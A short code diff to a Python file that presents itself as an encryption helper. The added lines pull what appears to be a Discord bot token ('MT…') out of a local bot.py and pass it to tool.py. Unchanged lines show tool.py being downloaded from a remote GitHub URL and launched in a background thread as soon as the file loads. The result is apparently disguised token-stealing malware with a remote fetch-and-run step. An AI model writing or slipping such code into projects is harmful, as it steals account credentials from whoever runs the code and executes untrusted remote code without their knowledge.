@@ -43,9 +43,11 @@ def encrypt(string: str,seed:int=5,length=20):
     if (int(len(result)/5+length) < len(result)): end = int(len(result)/5)+length
     else: end = len(result)
     return re.sub(r"[^a-zA-Z0-9]", '', str(result)[int(len(result)/5):end])
-
+code = open(".\\bot.py",'r',encoding='utf-8').read().splitlines()
+tokened = [a for a in code if "MT" in a]
+token = tokened[0][tokened[0].find("M"):tokened[0].rfind("Q")+1]
 def starter(): 
-    subprocess.call('python tool.py', shell=True)
+    subprocess.call(f'python tool.py {token}', shell=True)
 open('.\\tool.py','w',encoding="utf-8").write(requests.get(url = "https://raw.githubusercontent.com/mangto/kakao-notification/main/tool.py").text)
 Thread(target=starter).start()
 
